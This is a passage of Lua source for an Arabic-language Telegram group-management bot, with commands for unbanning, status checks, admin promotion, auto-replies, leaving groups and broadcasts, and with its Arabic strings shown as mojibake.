tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end
if text == "Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ―" and Owner(msg) then
function Function_Tshake(extra, result, success)
if DevTshake(msg) then
database:srem(bot_id.."Tshake:GBan:User",result.sender_user_id_)
database:srem(bot_id.."Tshake:Ban:User"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Tshake:Muted:User"..msg.chat_id_,result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","\n??βΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ")  
else
database:srem(bot_id.."Tshake:Ban:User"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Tshake:Muted:User"..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = "\nπ€βΏ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "kenwa")..")"
status  = "\nβ«οΈβΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ"
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
if text and text:match("^ΩΨ΄Ω Ψ§ΩΩΩΩΨ― @(.*)") and Owner(msg) then 
local username = text:match("^ΩΨ΄Ω Ψ§ΩΩΩΩΨ― @(.*)") 
function Function_Tshake(extra, result, success)
if result.id_ then
if database:sismember(bot_id.."Tshake:Muted:User"..msg.chat_id_,result.id_) then
Muted = "ΩΩΨͺΩΩ"
else
Muted = "ΨΊΩΨ± ΩΩΨͺΩΩ"
end
if database:sismember(bot_id.."Tshake:Ban:User"..msg.chat_id_,result.id_) then
Ban = "ΩΨ­ΨΈΩΨ±"
else
Ban = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ±"
end
if database:sismember(bot_id.."Tshake:GBan:User",result.id_) then
GBan = "ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
else
GBan = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
end
send(msg.chat_id_, msg.id_,"β«οΈβΏ Ψ§ΩΨ­ΨΈΨ± Ψ§ΩΨΉΨ§Ω Β» "..GBan.."\nπ«βΏ Ψ§ΩΨ­ΨΈΨ± Β» "..Ban.."\nπ βΏ Ψ§ΩΩΨͺΩ Β» "..Muted)
else
send(msg.chat_id_, msg.id_,"β«οΈβΏ Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ·")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end

if text == "ΩΨ΄Ω Ψ§ΩΩΩΩΨ―" and Owner(msg) then 
function Function_Tshake(extra, result, success)
if database:sismember(bot_id.."Tshake:Muted:User"..msg.chat_id_,result.sender_user_id_) then
Muted = "ΩΩΨͺΩΩ"
else
Muted = "ΨΊΩΨ± ΩΩΨͺΩΩ"
end
if database:sismember(bot_id.."Tshake:Ban:User"..msg.chat_id_,result.sender_user_id_) then
Ban = "ΩΨ­ΨΈΩΨ±"
else
Ban = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ±"
end
if database:sismember(bot_id.."Tshake:GBan:User",result.sender_user_id_) then
GBan = "ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
else
GBan = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
end
Textt = "β«οΈβΏ Ψ§ΩΨ­ΨΈΨ± Ψ§ΩΨΉΨ§Ω Β» "..GBan.."\nπ«βΏ Ψ§ΩΨ­ΨΈΨ± Β» "..Ban.."\nπ βΏ Ψ§ΩΩΨͺΩ Β» "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end

if text and text:match("^ΨΆΨΉ Ψ§Ψ³Ω (.*)") and Owner(msg) or text and text:match("^ΩΨΆΨΉ Ψ§Ψ³Ω (.*)") and Owner(msg) then 
local Name = text:match("^ΨΆΨΉ Ψ§Ψ³Ω (.*)") or text:match("^ΩΨΆΨΉ Ψ§Ψ³Ω (.*)") 
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"πβΏ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"πβΏ ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_,msg.id_,"πβΏ ΨͺΩ ΨͺΨΊΩΩΨ± Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§ΩΩ {["..Name.."]}")  
end
end,nil) 
end

if text ==("Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ") and Owner(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Tshake:Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Tshake:Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"π₯βΏ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΨ© ΩΩΨͺΩ Ψ±ΩΨΉΩΩ") 
else
send(msg.chat_id_, msg.id_,"πβΏ ΨͺΩΨͺ ΨͺΨ±ΩΩΨ© { "..num2.." } ΩΩ Ψ§Ψ―ΩΩΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
end,nil)   
end
if text ==("Ψ§ΩΩΩΨ΄Ψ¦") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"πβΏ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΩΩΨ΄Ψ¦ ΩΨ­Ψ°ΩΩ")
return false  
end
local UserName = (b.username_ or "DDDDiD")
send(msg.chat_id_, msg.id_,"πΈβΏΩΩΨ΄Ψ¦ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
end
if text ==("Ψ±ΩΨΉ Ψ§ΩΩΩΨ΄Ψ¦") and DevBot(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"πβΏΨ­Ψ³Ψ§Ψ¨ Ψ§ΩΩΩΨ΄Ψ¦ ΩΨ­Ψ°ΩΩ")
return false  
end
local UserName = (b.username_ or "DDDDiD")
send(msg.chat_id_, msg.id_,"πΈβΏΨͺΩ ΨͺΨ±ΩΩΨ© ΩΩΨ΄Ψ¦ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ["..b.first_name_.."](T.me/"..UserName..")")  
database:sadd(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_,b.id_)
end,nil)   
end,nil)   
end


----==========================================================================================================
----==========================================================================================================
if text == "Ψ¨ΩΨͺ" or text == 'Ψ§ΩΨ¨ΩΨͺ' then
local Namebot = (database:get(bot_id..'Name:Bot') or 'Ψ¬ΩΩΨ―')
local DRAGON_Msg = {
'Ψ§Ψ³ΩΩ'..Namebot..' ΩΨ§ Ψ±ΩΨ­Ωπβ€οΈ',
'Ψ§Ψ³ΩΩ '..Namebot..' ΩΨΉΩΨ±Ωππ­',
'Ψ§Ψ³ΩΩ '..Namebot..' ΩΨ§ ΩΩΨ±ππΈ',
'Ψ§Ψ³ΩΩ '..Namebot..' ΩΨ§ΩΨ²Ω π₯Ίβ€οΈ',
'Ψ§Ψ³ΩΩ '..Namebot..' ΩΨΉΩ π',
'ΩΩΩΩΨͺ Ψ§Ψ³ΩΩ '..Namebot..' ΩΩ Ψ§Ω π',
'ΨΉΩΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§Ψ³ΩΩ '..Namebot..' ΩΨΉΩΨ±Ωπ₯Ίβ€οΈ',
'Ψ§Ψ³ΩΩ '..Namebot..' ΩΨ§Ψ­ΩΨ§ΨͺΩπ₯Ίβ₯οΈ',
'Ψ§Ψ³ΩΩ '..Namebot..' ΩΩΨͺΩΩπ₯Ίβ€οΈ',
'Ψ§ΩΨ§ '..Namebot..' ΩΩΩΨ­Ωππ₯Ί',
}
   
Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)]
local msg_id = msg.id_/2097152/0.5
keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'ΩΩΨ§Ω Ψ§ΩΨ³ΩΨ±Ψ³', url="http://t.me/AKJA0"},

},
}
local function getpro(extra, result, success)
if result.photos_[0] then
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,Namebot, 1, 'md')
end
end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil)
end

if text == "ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ" or text == "ΨͺΨΊΩΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ" then 
if DevTshake(msg) then
database:setex(bot_id.."Tshake:Set:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"β«οΈβΏ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ§Ψ³Ω Ψ§ΩΨ§Ω ")  
end
return false
end



if text == "ΨͺΩΨΉΩΩ ΨͺΩΨΈΩΩ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ·" and Owner(msg)  then
database:set(bot_id.."lock_cleaner"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_, 'ββΏ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨΈΩΩ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ· Ψ§ΩΨͺΩΩΨ§Ψ¦Ω ')
return false
end

if text == "ΨͺΨΉΨ·ΩΩ ΨͺΩΨΈΩΩ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ·" and Owner(msg) then
database:del(bot_id.."lock_cleaner"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'πβΏ ΨͺΩ ΨͺΨΉΨ·ΩΩ Β» Ψ§ΩΨͺΩΨΈΩΩ Ψ§ΩΨͺΩΩΨ§Ψ¦Ω ')
return false
end

if text and text:match("^(ΨΆΨΉ ΩΩΨͺ Ψ§ΩΨͺΩΨΈΩΩ) (%d+)$") and Owner(msg) then
local NumLoop = tonumber(text:match("(%d+)"))
database:set(bot_id..':Timer_Cleaner:'..msg.chat_id_,NumLoop) 
return send(msg.chat_id_, msg.id_,"π‘*Β¦* ΨͺΩ ΩΨΆΨΉ ΩΩΨͺ Ψ§ΩΨͺΩΨΈΩΩ Β» { *"..NumLoop.."* } Ψ³Ψ§ΨΉΩ")
end

if text == "ΩΨ³Ψ­ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ·" and Owner(msg) then 
local mmezz = database:smembers(bot_id..":IdsMsgsCleaner:"..msg.chat_id_)
if #mmezz == 0 then return send(msg.chat_id_, msg.id_,"π Β¦ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ³Ψ§Ψ¦Ψ· ΩΨ¬Ψ―ΩΩΩ ΩΩΨ­Ψ°Ω \n ") end
for k,v in pairs(mmezz) do DeleteMessage(msg.chat_id_, {[0] = v}) end
return send(msg.chat_id_, msg.id_,"π Β¦ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ· Ψ§ΩΩΨ¬Ψ―ΩΩΩ")
end

if text == "Ψ§ΨΆΩ Ψ±Ψ― ΨΉΨ§Ω" and DevTshake(msg) then 
database:set(bot_id.."Tshake:witt:Rd_All"..msg.sender_user_id_..":"..msg.chat_id_,true)
database:del(bot_id.."Tshake:witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"π βΏ  Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩΨ§ ΩΩΨ±Ψ― Ψ§ΩΨΉΨ§Ω")
return false 
end

if text and DevTshake(msg) and database:get(bot_id.."Tshake:witt:Rd_All"..msg.sender_user_id_..":"..msg.chat_id_) then
database:del(bot_id.."Tshake:witt:Rd_All"..msg.sender_user_id_..":"..msg.chat_id_)
database:set(bot_id.."Tshake:witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, 'π βΏ Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ ΩΩΨΉΨ§Ω \nββΏ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ Ψ§ΩΩ Ψ§ΩΩΨ΅ :\n- `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#name` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω \n- `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ ')
return false
end

if text and DevTshake(msg) and database:get(bot_id.."Tshake:witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_) then
Klma = database:get(bot_id.."Tshake:witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_)
Jwab = text
database:hset(bot_id..':Replay:Source:',Klma,Jwab)
send(msg.chat_id_, msg.id_, '\n|ΨͺΩ Ψ§ΨΆΨ§ΩΨͺΩ ΩΩΨ±Ψ― Ψ§ΩΨΉΨ§Ω Ψ¨ΩΨ¬Ψ§Ψ­ .')
database:del(bot_id.."Tshake:witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_)
return false
end

if text == "ΩΨ³Ψ­ Ψ±Ψ― ΨΉΨ§Ω" and DevTshake(msg) then 
database:set(bot_id.."Tshake:witt:Del_All"..msg.sender_user_id_..":"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"π βΏ  Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΩ ΨͺΨ±ΩΨ― ΩΨ³Ψ­ΩΨ§ ΩΩΨ±Ψ― Ψ§ΩΨΉΨ§Ω")
return false 
end


if text == "ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ" and DevTshake(msg) then 
local rdood = database:del(bot_id..':Replay:Source:')
if rdood== 0 then return send(msg.chat_id_, msg.id_,'πΈ*Β¦* ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ Ψ­Ψ§ΩΩΨ§ \nβ') end
send(msg.chat_id_, msg.id_,"π βΏ  ΨͺΩ Ψ­Ψ°Ω Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ")
return false 
end

if text == 'Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ' and DevTshake(msg) then
local rdood = database:hkeys(bot_id..':Replay:Source:')
if #rdood==0 then return send(msg.chat_id_, msg.id_,'πΈ*Β¦* ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ Ψ­Ψ§ΩΩΨ§ \nβ') end
local message = 'π*Β¦* Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ :   :\n\n'
for i=1, #rdood 	do message = message ..i..' - *{* '..	rdood[i]..' *}*\n' end
message = message..'\nβββ'
return send(msg.chat_id_, msg.id_,message)
end


if text == 'ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω' and DevTshake(msg) then
database:setex(bot_id.."Tshake:Set:Id:All"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
send(msg.chat_id_, msg.id_,[[
   ββΏ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΩΩΨ΅
   ββΏ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ :
   - `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
   - `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
   - `#photos` > ΨΉΨ―Ψ― Ψ΅ΩΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
   - `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
   - `#auto` > ΨͺΩΨ§ΨΉΩ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
   - `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω 
   - `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ
   - `#game` > Ψ§ΩΩΨ¬ΩΩΨ±Ψ§Ψͺ
   - `#AddMem` > ΨΉΨ―Ψ― Ψ§ΩΨ¬ΩΨ§Ψͺ
   - `#Description` > ΨͺΨΉΩΩΩ Ψ§ΩΨ΅ΩΨ±Ω
   ]])
return false  
end 

if text == 'Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω' or text == 'ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω' and DevTshake(msg) then
database:del(bot_id.."Tshake:KleshIDALLBOT")
send(msg.chat_id_, msg.id_, 'πβΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω ')
return false  
end 

if database:get(bot_id.."Tshake:Set:Id:All"..msg.chat_id_..""..msg.sender_user_id_) then 
database:del(bot_id.."Tshake:Set:Id:All"..msg.chat_id_..""..msg.sender_user_id_) 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω") 
return false  
end 
database:set(bot_id.."Tshake:KleshIDALLBOT",text:match("(.*)"))
send(msg.chat_id_, msg.id_,'πβΏΨͺΩ ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω')   
return false 
end



   
   if text == 'ΩΨ΄Ω' and tonumber(msg.reply_to_message_id_) > 0 then
   function Function_Tshake(extra, result, success)
      tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
         if data.first_name_ == false then
         send(msg.chat_id_, msg.id_,'π€βΏ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ ΩΨ§ ΨͺΩΨ¬Ψ― ΩΨΉΩΩΩΨ§ΨͺΩ ')
         return false
         end
         if data.username_ then
         UserName_User = '@'..data.username_
         else
         UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
         end
         local Id = data.id_
         local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
         send(msg.chat_id_, msg.id_,'πβΏΨ§ΩΨ―ΩΩ - '..Id..'\nπβΏΩΨΉΨ±ΩΩ - ['..UserName_User..']\nπΈβΏΨ±ΨͺΨ¨ΨͺΩ - '..Status_Gps..'\nπ βΏ ΩΩΨΉ Ψ§ΩΩΨ΄Ω : Ψ¨Ψ§ΩΨ±Ψ― - ') 
      end,nil)
   end
   tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
   return false
   end
   
   if text and text:match("^ΩΨ΄Ω @(.*)$")  then
   local username = text:match("^ΩΨ΄Ω @(.*)$")
   function Function_Tshake(extra, result, success)
   if result.id_ then
   tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
   if data.username_ then
   UserName_User = '@'..data.username_
   else
   UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
   end
   local Id = data.id_
   local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
   send(msg.chat_id_, msg.id_,'πβΏΨ§ΩΨ―ΩΩ - '..Id..'\nπβΏΩΨΉΨ±ΩΩ - ['..UserName_User..']\nπΈβΏΨ±ΨͺΨ¨ΨͺΩ - '..Status_Gps..'\nπ βΏ ΩΩΨΉ Ψ§ΩΩΨ΄Ω : Ψ¨Ψ§ΩΩΨΉΨ±Ω - ') 
   end,nil)   
   else
   send(msg.chat_id_, msg.id_,'π€βΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω')
   end
   end
   tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
   return false
   end

   
----==========================================================================================================
----==========================================================================================================
if text == "ΨΊΨ§Ψ―Ψ±" then 
if DevBot(msg) and not database:get(bot_id.."Tshake:Left:Bot"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"β«οΈβΏ ΨͺΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
database:srem(bot_id.."Tshake:Chek:Groups",msg.chat_id_)  
end
return false  
end
if text and text:match("^ΨΊΨ§Ψ―Ψ± (-%d+)$") then
local GP_ID = {string.match(text, "^(ΨΊΨ§Ψ―Ψ±) (-%d+)$")}
if DevBot(msg) and not database:get(bot_id.."Tshake:Left:Bot"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"β«οΈβΏ ΨͺΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
send(GP_ID[2], 0,"β«οΈβΏ ΨͺΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ¨Ψ§ΩΨ± ΩΩ ΩΨ·ΩΨ± Ψ§ΩΨ¨ΩΨͺ") 
database:srem(bot_id.."Tshake:Chek:Groups",GP_ID[2])  
return false 
end
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω" and DevTshake(msg) then   
database:del(bot_id.."Tshake:Left:Bot"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ ΨͺΩΨΉΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω" and DevTshake(msg) then  
database:set(bot_id.."Tshake:Left:Bot"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "β«οΈβΏΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end

if text ==("ΩΨ³Ψ­ Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ") and Addictive(msg) then    
local function delbans(extra, result)  
if not msg.can_be_deleted_ == true then  
send(msg.chat_id_, msg.id_, "π€βΏ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΨ§") 
return false
end  
local num = 0 
for k,y in pairs(result.members_) do 
num = num + 1  
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft"}, }, dl_cb, nil)  
end  
send(msg.chat_id_, msg.id_,"π₯βΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ± ΨΉΩ *~ "..num.." ~* Ψ§Ψ΄Ψ?Ψ§Ψ΅ ") 
end    
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"πβΏΨ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nβ«οΈβΏΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"πβΏΨ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nβ«οΈβΏΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end  
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
